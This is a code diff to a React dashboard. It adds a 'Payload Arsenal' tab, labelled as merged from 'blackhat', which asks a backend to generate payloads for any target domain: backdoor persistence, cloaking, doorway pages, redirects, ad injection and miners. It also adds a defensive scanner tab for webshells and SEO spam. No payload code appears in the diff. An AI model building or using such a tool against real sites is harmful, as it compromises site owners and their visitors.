@@ -294,7 +294,14 @@ export default function AutonomousFriday() {
   });
 
   // ═══ UI state ═══
-  const [mainTab, setMainTab] = useState<"launch" | "monitor" | "history">("launch");
+  const [mainTab, setMainTab] = useState<"launch" | "monitor" | "history" | "arsenal" | "detect">("launch");
+  const [arsenalDomain, setArsenalDomain] = useState("");
+  const [arsenalRedirect, setArsenalRedirect] = useState("");
+  const [arsenalResults, setArsenalResults] = useState<any>(null);
+  const [arsenalRunning, setArsenalRunning] = useState(false);
+  const [detectDomain, setDetectDomain] = useState("");
+  const [detectResults, setDetectResults] = useState<any>(null);
+  const [detectRunning, setDetectRunning] = useState(false);
   const [eventFilter, setEventFilter] = useState<"all" | "success" | "error" | "pipeline">("all");
 
   // ─── Auth guard ───
@@ -1039,6 +1046,14 @@ export default function AutonomousFriday() {
           <TabsTrigger value="history" className="gap-1.5">
             <Clock className="w-3.5 h-3.5" />
             Recent
+          </TabsTrigger>
+          <TabsTrigger value="arsenal" className="gap-1.5">
+            <Bomb className="w-3.5 h-3.5" />
+            Arsenal
+          </TabsTrigger>
+          <TabsTrigger value="detect" className="gap-1.5">
+            <Shield className="w-3.5 h-3.5" />
+            Detect
           </TabsTrigger>
         </TabsList>
 
@@ -2206,6 +2221,286 @@ export default function AutonomousFriday() {
               )}
             </CardContent>
           </Card>
+        </TabsContent>
+
+        {/* ═══════════════════════════════════════════════ */}
+        {/* ═══ PAYLOAD ARSENAL TAB ═══ */}
+        {/* ═══════════════════════════════════════════════ */}
+        <TabsContent value="arsenal" className="mt-4">
+          <div className="space-y-4">
+            <Card className="border-red-500/20 bg-gradient-to-r from-red-950/30 to-transparent">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Bomb className="w-5 h-5 text-red-500" />
+                  Payload Arsenal
+                  <Badge variant="outline" className="bg-red-500/10 text-red-400 border-red-500/30 text-xs">MERGED FROM BLACKHAT</Badge>
+                </CardTitle>
+                <CardDescription>
+                  Generate attack payloads for any domain — persistence, cloaking, SEO manipulation, redirects, doorway pages
+                </CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="flex flex-col md:flex-row gap-3">
+                  <div className="flex-1">
+                    <Label className="text-xs text-muted-foreground mb-1 block">Target Domain</Label>
+                    <Input
+                      placeholder="example.com"
+                      value={arsenalDomain}
+                      onChange={(e) => setArsenalDomain(e.target.value)}
+                      className="bg-background/50"
+                    />
+                  </div>
+                  <div className="flex-1">
+                    <Label className="text-xs text-muted-foreground mb-1 block">Redirect URL</Label>
+                    <Input
+                      placeholder="https://your-destination.com"
+                      value={arsenalRedirect}
+                      onChange={(e) => setArsenalRedirect(e.target.value)}
+                      className="bg-background/50"
+                    />
+                  </div>
+                  <div className="flex items-end">
+                    <Button
+                      onClick={async () => {
+                        if (!arsenalDomain.trim()) { toast.error("Enter a domain"); return; }
+                        setArsenalRunning(true);
+                        try {
+                          const res = await fetch(`/api/trpc/blackhat.runFullChain`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            credentials: "include",
+                            body: JSON.stringify({ json: { domain: arsenalDomain.trim(), redirectUrl: arsenalRedirect.trim() || undefined } }),
+                          });
+                          const data = await res.json();
+                          setArsenalResults(data?.result?.data?.json || data);
+                          toast.success("Payloads generated!");
+                        } catch (err: any) {
+                          toast.error(err.message);
+                        } finally {
+                          setArsenalRunning(false);
+                        }
+                      }}
+                      disabled={arsenalRunning || !arsenalDomain.trim()}
+                      className="bg-red-600 hover:bg-red-700 text-white whitespace-nowrap"
+                    >
+                      {arsenalRunning ? (
+                        <><Loader2 className="h-4 w-4 animate-spin mr-2" /> Generating...</>
+                      ) : (
+                        <><Zap className="h-4 w-4 mr-2" /> Generate Payloads</>
+                      )}
+                    </Button>
+                  </div>
+                </div>
+
+                {/* Payload Categories */}
+                <div className="grid grid-cols-2 md:grid-cols-5 gap-2">
+                  {[
+                    { icon: Shield, label: "Persistence", desc: "Backdoors, auto-restore", color: "text-red-500", bg: "bg-red-500/10" },
+                    { icon: Eye, label: "Cloaking", desc: "Bot vs human detection", color: "text-purple-500", bg: "bg-purple-500/10" },
+                    { icon: Search, label: "SEO Manipulation", desc: "Sitemap, doorways, links", color: "text-blue-500", bg: "bg-blue-500/10" },
+                    { icon: ArrowUpRight, label: "Redirects", desc: "Conditional, geo, JS", color: "text-green-500", bg: "bg-green-500/10" },
+                    { icon: Code, label: "Monetization", desc: "Ad injection, miners", color: "text-yellow-500", bg: "bg-yellow-500/10" },
+                  ].map((cat, i) => {
+                    const Icon = cat.icon;
+                    return (
+                      <div key={i} className={`p-3 rounded-lg border ${cat.bg} border-opacity-30`}>
+                        <Icon className={`w-4 h-4 ${cat.color} mb-1`} />
+                        <p className="text-xs font-semibold">{cat.label}</p>
+                        <p className="text-[10px] text-muted-foreground">{cat.desc}</p>
+                      </div>
+                    );
+                  })}
+                </div>
+              </CardContent>
+            </Card>
+
+            {/* Arsenal Results */}
+            {arsenalResults && (
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg flex items-center gap-2">
+                    <FileCode className="w-5 h-5 text-red-500" />
+                    Generated Payloads
+                    <Badge variant="outline">{arsenalResults.totalPayloads || 0} payloads</Badge>
+                    <Badge variant="outline" className="bg-red-500/10 text-red-400">Risk: {arsenalResults.overallRisk || "N/A"}/10</Badge>
+                  </CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <ScrollArea className="h-[500px]">
+                    <div className="space-y-3">
+                      {(arsenalResults.phases || []).map((phase: any, pi: number) => (
+                        <div key={pi} className="border rounded-lg p-3">
+                          <div className="flex items-center gap-2 mb-2">
+                            <Badge variant="outline" className="text-xs">Phase {phase.phase}</Badge>
+                            <span className="font-semibold text-sm">{phase.name}</span>
+                            <Badge variant="outline" className="ml-auto text-xs">{phase.payloads?.length || 0} payloads</Badge>
+                          </div>
+                          <p className="text-xs text-muted-foreground mb-2">{phase.summary}</p>
+                          <div className="space-y-1.5">
+                            {(phase.payloads || []).slice(0, 5).map((p: any, i: number) => (
+                              <div key={i} className="flex items-center gap-2 text-xs p-2 rounded bg-muted/30">
+                                <Code className="w-3 h-3 text-muted-foreground shrink-0" />
+                                <span className="font-mono text-[11px] truncate flex-1">{p.filename || p.name}</span>
+                                <Badge variant="outline" className="text-[10px]">{p.type}</Badge>
+                              </div>
+                            ))}
+                            {(phase.payloads?.length || 0) > 5 && (
+                              <p className="text-[10px] text-muted-foreground pl-5">+{phase.payloads.length - 5} more...</p>
+                            )}
+                          </div>
+                        </div>
+                      ))}
+                    </div>
+                  </ScrollArea>
+                </CardContent>
+              </Card>
+            )}
+          </div>
+        </TabsContent>
+
+        {/* ═══════════════════════════════════════════════ */}
+        {/* ═══ DETECTION SCAN TAB ═══ */}
+        {/* ═══════════════════════════════════════════════ */}
+        <TabsContent value="detect" className="mt-4">
+          <div className="space-y-4">
+            <Card className="border-yellow-500/20 bg-gradient-to-r from-yellow-950/30 to-transparent">
+              <CardHeader>
+                <CardTitle className="flex items-center gap-2">
+                  <Shield className="w-5 h-5 text-yellow-500" />
+                  Detection Scanner
+                  <Badge variant="outline" className="bg-yellow-500/10 text-yellow-400 border-yellow-500/30 text-xs">DEFENSE</Badge>
+                </CardTitle>
+                <CardDescription>
+                  Scan a domain for existing compromises, backdoors, SEO spam, and suspicious indicators
+                </CardDescription>
+              </CardHeader>
+              <CardContent className="space-y-4">
+                <div className="flex gap-3">
+                  <div className="flex-1">
+                    <Input
+                      placeholder="domain-to-scan.com"
+                      value={detectDomain}
+                      onChange={(e) => setDetectDomain(e.target.value)}
+                      className="bg-background/50"
+                      onKeyDown={(e) => {
+                        if (e.key === "Enter" && detectDomain.trim()) {
+                          setDetectRunning(true);
+                          fetch(`/api/trpc/blackhat.detect`, {
+                            method: "POST",
+                            headers: { "Content-Type": "application/json" },
+                            credentials: "include",
+                            body: JSON.stringify({ json: { domain: detectDomain.trim() } }),
+                          })
+                            .then(r => r.json())
+                            .then(data => { setDetectResults(data?.result?.data?.json || data); toast.success("Scan complete!"); })
+                            .catch(err => toast.error(err.message))
+                            .finally(() => setDetectRunning(false));
+                        }
+                      }}
+                    />
+                  </div>
+                  <Button
+                    onClick={() => {
+                      if (!detectDomain.trim()) { toast.error("Enter a domain"); return; }
+                      setDetectRunning(true);
+                      fetch(`/api/trpc/blackhat.detect`, {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        credentials: "include",
+                        body: JSON.stringify({ json: { domain: detectDomain.trim() } }),
+                      })
+                        .then(r => r.json())
+                        .then(data => { setDetectResults(data?.result?.data?.json || data); toast.success("Scan complete!"); })
+                        .catch(err => toast.error(err.message))
+                        .finally(() => setDetectRunning(false));
+                    }}
+                    disabled={detectRunning || !detectDomain.trim()}
+                    className="bg-yellow-600 hover:bg-yellow-700 text-white"
+                  >
+                    {detectRunning ? (
+                      <><Loader2 className="h-4 w-4 animate-spin mr-2" /> Scanning...</>
+                    ) : (
+                      <><Search className="h-4 w-4 mr-2" /> Scan</>
+                    )}
+                  </Button>
+                </div>
+
+                {/* Detection Categories */}
+                <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
+                  {[
+                    { icon: Bug, label: "Backdoors", desc: "Hidden shells, webshells", color: "text-red-500" },
+                    { icon: Link2, label: "SEO Spam", desc: "Injected links, doorways", color: "text-orange-500" },
+                    { icon: ArrowUpRight, label: "Redirects", desc: "Malicious redirects", color: "text-yellow-500" },
+                    { icon: ShieldAlert, label: "Indicators", desc: "Suspicious patterns", color: "text-purple-500" },
+                  ].map((cat, i) => {
+                    const Icon = cat.icon;
+                    return (
+                      <div key={i} className="p-3 rounded-lg border bg-muted/20">
+                        <Icon className={`w-4 h-4 ${cat.color} mb-1`} />
+                        <p className="text-xs font-semibold">{cat.label}</p>
+                        <p className="text-[10px] text-muted-foreground">{cat.desc}</p>
+                      </div>
+                    );
+                  })}
+                </div>
+              </CardContent>
+            </Card>
+
+            {/* Detection Results */}
+            {detectResults && (
+              <Card>
+                <CardHeader>
+                  <CardTitle className="text-lg flex items-center gap-2">
+                    <ShieldAlert className="w-5 h-5 text-yellow-500" />
+                    Scan Results
+                    {detectResults.compromised ? (
+                      <Badge className="bg-red-500/20 text-red-400 border-red-500/30">COMPROMISED</Badge>
+                    ) : (
+                      <Badge className="bg-green-500/20 text-green-400 border-green-500/30">CLEAN</Badge>
+                    )}
+                  </CardTitle>
+                </CardHeader>
+                <CardContent>
+                  <ScrollArea className="h-[400px]">
+                    <div className="space-y-3">
+                      {(detectResults.detections || []).map((d: any, i: number) => (
+                        <div key={i} className={`p-3 rounded-lg border ${
+                          d.severity === "critical" ? "border-red-500/30 bg-red-500/5" :
+                          d.severity === "high" ? "border-orange-500/30 bg-orange-500/5" :
+                          d.severity === "medium" ? "border-yellow-500/30 bg-yellow-500/5" :
+                          "border-blue-500/30 bg-blue-500/5"
+                        }`}>
+                          <div className="flex items-center gap-2 mb-1">
+                            <Badge variant="outline" className="text-[10px]">{d.severity?.toUpperCase()}</Badge>
+                            <span className="font-semibold text-sm">{d.type}</span>
+                          </div>
+                          <p className="text-xs text-muted-foreground">{d.detail}</p>
+                          {d.evidence && <p className="text-[10px] font-mono mt-1 text-muted-foreground/70 truncate">{d.evidence}</p>}
+                        </div>
+                      ))}
+                      {(detectResults.liveChecks || []).map((c: any, i: number) => (
+                        <div key={`lc-${i}`} className="p-2 rounded border bg-muted/20 flex items-center gap-2">
+                          {c.status === "found" ? (
+                            <XCircle className="w-3.5 h-3.5 text-red-500 shrink-0" />
+                          ) : (
+                            <CheckCircle2 className="w-3.5 h-3.5 text-green-500 shrink-0" />
+                          )}
+                          <span className="text-xs">{c.path}</span>
+                          <Badge variant="outline" className="text-[10px] ml-auto">{c.status}</Badge>
+                        </div>
+                      ))}
+                      {(!detectResults.detections?.length && !detectResults.liveChecks?.length) && (
+                        <div className="text-center py-8 text-muted-foreground">
+                          <Shield className="w-8 h-8 mx-auto mb-2 opacity-30" />
+                          <p className="text-sm">No detections found</p>
+                        </div>
+                      )}
+                    </div>
+                  </ScrollArea>
+                </CardContent>
+              </Card>
+            )}
+          </div>
         </TabsContent>
       </Tabs>
     </div>
